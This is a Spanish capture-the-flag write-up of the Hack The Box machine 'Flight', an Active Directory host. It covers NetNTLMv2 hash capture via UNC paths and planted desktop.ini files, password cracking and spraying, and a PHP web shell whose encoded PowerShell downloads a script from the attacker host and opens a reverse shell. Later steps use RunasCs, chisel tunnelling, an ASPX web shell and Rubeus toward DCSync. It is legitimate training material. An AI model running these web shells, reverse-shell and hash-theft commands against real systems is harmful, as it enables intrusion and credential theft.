---
layout: post
title: Flight
date: 2023-10-15
description:
img:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/Flight-htb/Flight.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.187 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 14:44 GMT
Nmap scan report for 10.10.11.187
Host is up (0.052s latency).
Not shown: 65518 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49694/tcp open  unknown
49723/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 26.43 seconds
```

### Escaneo de versión y servicios de cada puerto

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
nmap -sCV -p53,80,88,135,139,389,445,464,593,636,5985,9389,49667,49673,49674,49694,49723 10.10.11.187 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 14:45 GMT
Nmap scan report for 10.10.11.187
Host is up (0.12s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-07 21:45:48Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49723/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-05-07T21:46:43
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: 7h00m02s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.29 seconds
```

Añado el dominio ```flight.htb``` al ```/etc/hosts```

## Puerto 43 (DNS)

Aplico fuerza bruta de subdominios

```null
dnsenum --dnsserver 10.10.11.187 --threads 200 -f /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt flight.htb
dnsenum VERSION:1.2.6

-----   flight.htb   -----


Host's addresses:
__________________

flight.htb.                              600      IN    A        192.168.22.180


Name Servers:
______________

g0.flight.htb.                           3600     IN    A        10.10.11.187


Mail (MX) Servers:
___________________



Trying Zone Transfers and getting Bind Versions:
_________________________________________________

unresolvable name: g0.flight.htb at /usr/bin/dnsenum line 900 thread 1.

Trying Zone Transfer for flight.htb on g0.flight.htb ... 
AXFR record query failed: no nameservers


Brute forcing with /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:
________________________________________________________________________________________________

gc._msdcs.flight.htb.                    600      IN    A        192.168.22.180
domaindnszones.flight.htb.               600      IN    A        192.168.22.180
forestdnszones.flight.htb.               600      IN    A        192.168.22.180


flight.htb class C netranges:
______________________________



Performing reverse lookup on 0 ip addresses:
_____________________________________________


0 results out of 0 IP addresses.


flight.htb ip blocks:
______________________


done.
```

Añado ```g0.flight.htb``` al ```/etc/hosts```

## Puerto 445 (SMB)

Con ```crackmapexec``` aplico un escaneo para ver el hostname, dominio y versiones

```null
crackmapexec smb 10.10.11.187
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.187
http://10.10.11.187 [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1], IP[10.10.11.187], JQuery[1.4.2], OpenSSL[1.1.1m], PHP[8.1.1], Script[text/javascript], Title[g0 Aviation]
```

La página principal se ve así:

<img src="/writeups/assets/img/Flight-htb/1.png" alt="">

Vuelvo a fuzzear subdominios, pero a través de la web

```null
wfuzz -c --hh=7069 -t 200 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.flight.htb" http://flight.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://flight.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000624:   200        90 L     412 W      3996 Ch     "school"                                                                                                                                        

Total time: 19.14790
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 260.5507
```

Añado ```school.flight.htb``` al ```/etc/hosts```

Tiene el siguiente aspecto

<img src="/writeups/assets/img/Flight-htb/2.png" alt="">

Pruebo un LFI, pero el servidor me lo impide

<img src="/writeups/assets/img/Flight-htb/3.png" alt="">

Al cargar los recursos PHP con este parámetro, la longitud de respuesta cambia, por lo que no los interpreta y está imprimiendo en el código fuente

```null
gobuster fuzz -u 'http://school.flight.htb/index.php?view=FUZZ.php' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --exclude-length 1102
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://school.flight.htb/index.php?view=FUZZ.php
[+] Method:           GET
[+] Threads:          10
[+] Wordlist:         /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Exclude Length:   1102
[+] User Agent:       gobuster/3.1.0
[+] Timeout:          10s
===============================================================
2023/05/07 15:05:01 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=3194] http://school.flight.htb/index.php?view=index.php
```

<img src="/writeups/assets/img/Flight-htb/4.png" alt="">

Cargo un recurso compartido a nivel de red y con ```impacket-smbserver``` intercepto un hash NetNTLMv2

```null
curl -s -X GET http://school.flight.htb/index.php?view=//10.10.16.5/shared/test
```

```null
impacket-smbserver shared $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.187,56859)
[*] AUTHENTICATE_MESSAGE (flight\svc_apache,G0)
[*] User G0\svc_apache authenticated successfully
[*] svc_apache::flight:aaaaaaaaaaaaaaaa:5029ceea8930c1a044b00f9d44d60af9:0101000000000000805d7f23f680d901306e00cc562ab220000000000100100048005a0042006300630065006b0057000300100048005a0042006300630065006b0057000200100041004b006c00790059005900440049000400100041004b006c007900590059004400490007000800805d7f23f680d901060004000200000008003000300000000000000000000000003000007f7cbfa707dc2f97b4fbc3a750edcb5e5c39f6212ea08c469df369a9d858c74b0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00330030000000000000000000
[*] Closing down connection (10.10.11.187,56859)
[*] Remaining connections []
```

Lo crackeo con ```john```

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
S@Ss!K@*t13      (svc_apache)     
1g 0:00:00:04 DONE (2023-05-07 15:13) 0.2222g/s 2369Kp/s 2369Kc/s 2369KC/s SADSAF..S4210430
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Son válidas

```null
crackmapexec smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13'
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
```

Pero no me puedo conectar por ```winrm```

```null
crackmapexec winrm 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13'
SMB         10.10.11.187    5985   G0               [*] Windows 10.0 Build 17763 (name:G0) (domain:flight.htb)
HTTP        10.10.11.187    5985   G0               [*] http://10.10.11.187:5985/wsman
WINRM       10.10.11.187    5985   G0               [-] flight.htb\svc_apache:S@Ss!K@*t13
```

Enumero los usuarios del dominio

```null
crackmapexec ldap 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13' --users
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.187    389    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
LDAP        10.10.11.187    389    G0               [*] Total of records returned 18
LDAP        10.10.11.187    389    G0               Administrator                  Built-in account for administering the computer/domain
LDAP        10.10.11.187    389    G0               Guest                          Built-in account for guest access to the computer/domain
LDAP        10.10.11.187    389    G0               krbtgt                         Key Distribution Center Service Account
LDAP        10.10.11.187    389    G0               S.Moon                         Junion Web Developer
LDAP        10.10.11.187    389    G0               R.Cold                         HR Assistant
LDAP        10.10.11.187    389    G0               G.Lors                         Sales manager
LDAP        10.10.11.187    389    G0               L.Kein                         Penetration tester
LDAP        10.10.11.187    389    G0               M.Gold                         Sysadmin
LDAP        10.10.11.187    389    G0               C.Bum                          Senior Web Developer
LDAP        10.10.11.187    389    G0               W.Walker                       Payroll officer
LDAP        10.10.11.187    389    G0               I.Francis                      Nobody knows why he's here
LDAP        10.10.11.187    389    G0               D.Truff                        Project Manager
LDAP        10.10.11.187    389    G0               V.Stevens                      Secretary
LDAP        10.10.11.187    389    G0               svc_apache                     Service Apache web
LDAP        10.10.11.187    389    G0               O.Possum                       Helpdesk
```

Dos no son válidos y el resto no ASPRepRoasteables

```null
GetNPUsers.py flight.htb/ -no-pass -usersfile users
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User S.Moon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User R.Cold doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User G.Lors doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Kein doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User M.Gold doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Bum doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User W.Walker doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User I.Francis doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User D.Truff doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User V.Stevens doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_apache doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User O.Possum doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Puedo listar los recursos compartidos a nivel de red

```null
smbmap -H 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13'
                                                                                                    
[+] IP: 10.10.11.187:445	Name: school.flight.htb   	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Shared                                            	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
	Web                                               	READ ONLY	
```

Tengo acceso a los archivos de la web, pero con capacidad de lectura y no escritura

```null
smbmap -H 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13' -r 'Web'
                                                                                                    
[+] IP: 10.10.11.187:445	Name: school.flight.htb   	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Web                                               	READ ONLY	
	.\Web\\*
	dr--r--r--                0 Sun May  7 22:17:00 2023	.
	dr--r--r--                0 Sun May  7 22:17:00 2023	..
	dr--r--r--                0 Sun May  7 22:17:00 2023	flight.htb
	dr--r--r--                0 Sun May  7 22:17:00 2023	school.flight.htb
```

Se reutiliza la credencial de ```svc_apache``` para ```S.Moon```

```null
crackmapexec smb 10.10.11.187 -u users -p 'S@Ss!K@*t13' --continue-on-success | grep -v "-"
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
```

Sigo sin poder conectarme por WINRM

```null
crackmapexec winrm 10.10.11.187 -u 'S.Moon' -p 'S@Ss!K@*t13'
SMB         10.10.11.187    5985   G0               [*] Windows 10.0 Build 17763 (name:G0) (domain:flight.htb)
HTTP        10.10.11.187    5985   G0               [*] http://10.10.11.187:5985/wsman
WINRM       10.10.11.187    5985   G0               [-] flight.htb\S.Moon:S@Ss!K@*t13
```

Tengo capacidad de escritura en ```Shared```

```null
smbmap -H 10.10.11.187 -u 'S.Moon' -p 'S@Ss!K@*t13'
                                                                                                    
[+] IP: 10.10.11.187:445        Name: school.flight.htb         Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS        Remote Admin
        C$                                                      NO ACCESS        Default share
        IPC$                                                    READ ONLY        Remote IPC
        NETLOGON                                                READ ONLY        Logon server share 
        Shared                                                  READ, WRITE      
        SYSVOL                                                  READ ONLY        Logon server share 
        Users                                                   READ ONLY        
        Web                                                     READ ONLY   
```

Me conecto con ```smbclient```

```null
smbclient //10.10.11.187/Shared -U 'svc_apache%S@Ss!K@*t13'
Try "help" to get a list of possible commands.
smb: \> 
```

Utilizo la herramienta [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) para crear un archivo que se encargue de cargar un recurso compartido a nivel de red de mi equipo, para así, obtener el hash NetNTMLv2 de un usuario. En este caso, no va a servir el típico SCF malicioso

```null
python3 ntlm_theft.py --generate all --server 10.10.16.5 --filename pwned
Created: pwned/pwned.scf (BROWSE TO FOLDER)
Created: pwned/pwned-(url).url (BROWSE TO FOLDER)
Created: pwned/pwned-(icon).url (BROWSE TO FOLDER)
Created: pwned/pwned.lnk (BROWSE TO FOLDER)
Created: pwned/pwned.rtf (OPEN)
Created: pwned/pwned-(stylesheet).xml (OPEN)
Created: pwned/pwned-(fulldocx).xml (OPEN)
Created: pwned/pwned.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: pwned/pwned-(includepicture).docx (OPEN)
Created: pwned/pwned-(remotetemplate).docx (OPEN)
Created: pwned/pwned-(frameset).docx (OPEN)
Created: pwned/pwned-(externalcell).xlsx (OPEN)
Created: pwned/pwned.wax (OPEN)
Created: pwned/pwned.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: pwned/pwned.asx (OPEN)
Created: pwned/pwned.jnlp (OPEN)
Created: pwned/pwned.application (DOWNLOAD AND OPEN)
Created: pwned/pwned.pdf (OPEN AND ALLOW)
Created: pwned/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: pwned/Autorun.inf (BROWSE TO FOLDER)
Created: pwned/desktop.ini (BROWSE TO FOLDER)
Generation Complete.
```

```null
smbclient //10.10.11.187/Shared -U 'S.moon%S@Ss!K@*t13'
Try "help" to get a list of possible commands.
smb: \> put test.scf 
NT_STATUS_ACCESS_DENIED opening remote file \test.scf
smb: \> put desktop.ini 
putting file desktop.ini as \desktop.ini (0.1 kb/s) (average 0.1 kb/s)
```

```null
impacket-smbserver shared $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.187,49741)
[*] AUTHENTICATE_MESSAGE (flight.htb\c.bum,G0)
[*] User G0\c.bum authenticated successfully
[*] c.bum::flight.htb:aaaaaaaaaaaaaaaa:97b95143c6a7ddeed569aceb20569710:0101000000000000008b891d8f81d90141be3a70ed28972a00000000010010004200670047004e0076004e004f004700030010004200670047004e0076004e004f004700020010004b007000470071007a00510064007300040010004b007000470071007a0051006400730007000800008b891d8f81d901060004000200000008003000300000000000000000000000003000008518d77ac1ee5f30db12e5b9b9d2062513150661fc5d2c98060cb4b875b165eb0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00330030000000000000000000
[*] Closing down connection (10.10.11.187,49741)
```

Lo crackeo con ```john```

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Tikkycoll_431012284 (c.bum)     
1g 0:00:00:05 DONE (2023-05-08 09:26) 0.1886g/s 1988Kp/s 1988Kc/s 1988KC/s TinyMite1..Tiffani1432
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

No es válida por WINRM

```null
crackmapexec winrm 10.10.11.187 -u 'c.bum' -p 'Tikkycoll_431012284'
SMB         10.10.11.187    5985   G0               [*] Windows 10.0 Build 17763 (name:G0) (domain:flight.htb)
HTTP        10.10.11.187    5985   G0               [*] http://10.10.11.187:5985/wsman
WINRM       10.10.11.187    5985   G0               [-] flight.htb\c.bum:Tikkycoll_431012284
```

Pero puede escribir dentro del directorio ```Web```

```null
smbmap -H 10.10.11.187 -u 'C.bum' -p 'Tikkycoll_431012284'
                                                                                                    
[+] IP: 10.10.11.187:445        Name: school.flight.htb         Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS        Remote Admin
        C$                                                      NO ACCESS        Default share
        IPC$                                                    READ ONLY        Remote IPC
        NETLOGON                                                READ ONLY        Logon server share 
        Shared                                                  READ, WRITE      
        SYSVOL                                                  READ ONLY        Logon server share 
        Users                                                   READ ONLY        
        Web                                                     READ, WRITE  
```

Creo un archivo ```cmd.php``` para enviarme una reverse shell al compartirme el ```Invoke-PowerShellTcp.ps1``` con un servicio HTTP con ```python```

```null
echo 'IEX(New-Object Net.WebClient).downloadString("http://10.10.16.5/Invoke-PowerShellTcp.ps1")' | iconv -t utf-16le | base64 -w 0 | xclip -sel clip
```

```php
<?php
  system("powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADMAMAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQAKAA==")
?>
```

Agreogo un oneliner al final del ```Invoke-PowerShellTcp.ps1``` para que se una vez se interprete, lo ejecute

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.5 -Port 443
```

Lo subo al directorio ```flight.htb```

```null
smbclient.py flight.htb/c.bum:'Tikkycoll_431012284'@10.10.11.187
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
Shared
SYSVOL
Users
Web
# use Web
# ls
drw-rw-rw-          0  Sun Oct 15 16:28:12 2023 .
drw-rw-rw-          0  Sun Oct 15 16:28:12 2023 ..
drw-rw-rw-          0  Sun Oct 15 16:27:01 2023 flight.htb
drw-rw-rw-          0  Sun Oct 15 16:27:01 2023 school.flight.htb
# cd flight.htb
# put cmd.php
```

Tramito una petición por GET a ese archivo

```null
curl -s -X GET http://flight.htb/cmd.php
```

Gano acceso al sistema como el usuario ```svc_apache```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.187] 49831
Windows PowerShell running as user svc_apache on G0
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\flight.htb>whoami
flight\svc_apache
```

Tiene abierto el puerto 8000 internamente

```null
Active Connections

  Proto  Local Address          Foreign Address        State           Offload State

  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       InHost      
```

Listo los privilegios dentro de ```inetpub```

```null
PS C:\inetpub> icacls *
custerr BUILTIN\Users:(RX)
        BUILTIN\Administrators:(F)
        NT AUTHORITY\SYSTEM:(F)
        NT SERVICE\TrustedInstaller:(I)(F)
        NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
        NT AUTHORITY\SYSTEM:(I)(F)
        NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
        BUILTIN\Administrators:(I)(F)
        BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
        BUILTIN\Users:(I)(RX)
        BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
        CREATOR OWNER:(I)(OI)(CI)(IO)(F)

development flight\C.Bum:(OI)(CI)(W)
            NT SERVICE\TrustedInstaller:(I)(F)
            NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
            NT AUTHORITY\SYSTEM:(I)(F)
            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
            BUILTIN\Administrators:(I)(F)
            BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
            BUILTIN\Users:(I)(RX)
            BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
            CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 2 files; Failed processing 1 files
```

El usuario ```C.Bum``` es propietario de ```development```. Tengo sus credenciales. Probé a migrar a una shell como este a través de ScriptBlocks y PSSessions, pero no tenía privilegios, por lo que la única forma es utilizando ```runas```, pero no el nátivo de Windows, si no que trabaje en entornos no gráficos, [runascs](https://github.com/antonioCoco/RunasCs). Lo transfiero a la máquina y ejecuto


```null
PS C:\Temp> .\RunasCs.exe C.bum Tikkycoll_431012284 whoami
[*] Warning: Using function CreateProcessWithLogonW is not compatible with logon type 8. Reverting to logon type Interactive (2)...
flight\c.bum
```

Me envío una reverse shell

```null
PS C:\Temp> .\RunasCs.exe C.bum Tikkycoll_431012284 powershell -r 10.10.16.5:443
[*] Warning: Using function CreateProcessWithLogonW is not compatible with logon type 8. Reverting to logon type Interactive (2)...
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-5e103$\Default
[+] Async process 'powershell' with pid 5716 created and left in background.
```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.187] 49928
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
flight\c.bum
```

Puedo ver la primera flag

```null
PS C:\Users\C.bum\Desktop> type user.txt
type user.txt
6b73efa3e82aac6cb56560ba10f734a3
```

# Escalada

Subo el ```chisel.exe``` para traerme el puerto 8000. En mi equipo lo ejecuto como servidor

```null
chisel server -p 1234 --reverse
```

Desde el Windows como cliente

```null
PS C:\Temp> .\chisel.exe client 10.10.16.5:1234 R:socks
```

Lo abro con ```Firefox``` pasando por el túnel y se ve así:

<img src="/writeups/assets/img/Flight-htb/5.png" alt="">

Está desplegada desde el directorio ```C:\inetpub\development```

```null
PS C:\inetpub\development> dir
dir


    Directory: C:\inetpub\development


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       10/15/2023   9:47 AM                css                                                                   
d-----       10/15/2023   9:47 AM                fonts                                                                 
d-----       10/15/2023   9:47 AM                img                                                                   
d-----       10/15/2023   9:47 AM                js                                                                    
-a----        4/16/2018   2:23 PM           9371 contact.html                                                          
-a----        4/16/2018   2:23 PM          45949 index.html       
```

Tengo capacidad de escritura como el usuario ```c.bum```

```null
PS C:\inetpub> icacls development
icacls development
development flight\C.Bum:(OI)(CI)(W)
            NT SERVICE\TrustedInstaller:(I)(F)
            NT SERVICE\TrustedInstaller:(I)(OI)(CI)(IO)(F)
            NT AUTHORITY\SYSTEM:(I)(F)
            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
            BUILTIN\Administrators:(I)(F)
            BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
            BUILTIN\Users:(I)(RX)
            BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
            CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

Esta vez hay que subir un ```ASPX``` ya que emplea este entorno de trabajo. Busco por webshells previamente scripteadas en mi equipo

```null
locate cmd.aspx
/opt/webshell/fuzzdb-webshell/asp/cmd.aspx
/opt/webshell/web-malware-collection-13-06-2012/ASP/cmd.aspx
/usr/share/davtest/backdoors/aspx_cmd.aspx
/usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx
/usr/share/wordlists/SecLists/Web-Shells/FuzzDB/cmd.aspx
```

En mi caso, utilicé la del repositorio de ```Seclists```. Me envío una reverse shell de la misma forma que antes

<img src="/writeups/assets/img/Flight-htb/6.png" alt="">

Gano acceso como el usuario ```iis apppool\defaultapppool```

```null
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.187] 49866
Windows PowerShell running as user G0$ on G0
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
iis apppool\defaultapppool
```

Algo a a tener en cuenta es que las cuentas relaccionadas con IIS suelen estar asociadas como ```Microsoft Virtual Account```, lo que implica que la autenticación a nivel de red lo hará a nivel de red lo hará como la ```Machine Account``` y el hash NetNTLMv2 será como esta. Si listo lo que hay en un recurso compartido a nivel de red creado por mí:

```null
PS C:\windows\system32\inetsrv> dir \\10.10.16.5\shared
```

Podré ver el hash de ```flight\G0$```

```null
impacket-smbserver shared $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.187,49886)
[*] AUTHENTICATE_MESSAGE (flight\G0$,G0)
[*] User G0\G0$ authenticated successfully
[*] G0$::flight:aaaaaaaaaaaaaaaa:3ac3a69d20cdc9044ffeac091296e793:01010000000000008070127d4fffd90108088ebdd522ef94000000000100100057004a006500780053004e00680050000300100057004a006500780053004e0068005000020010006800720058005a004b00520078005000040010006800720058005a004b00520078005000070008008070127d4fffd90106000400020000000800300030000000000000000000000000300000d1e2ba486071888229d80d164b64aef95611a560bdb1164b3e50c2b6e8154fe70a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0035000000000000000000
[*] Closing down connection (10.10.11.187,49886)
[*] Remaining connections []
```

No se puede crackear ya que la contraseña es robusta y dinámica, pero sí obtener un hash TGT y posteriormente realizar un ```DC Sync```. Subo el ```Rubeus``` a la máquina víctima para obtener la información necesaria

```null
PS C:\Temp> .\Rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


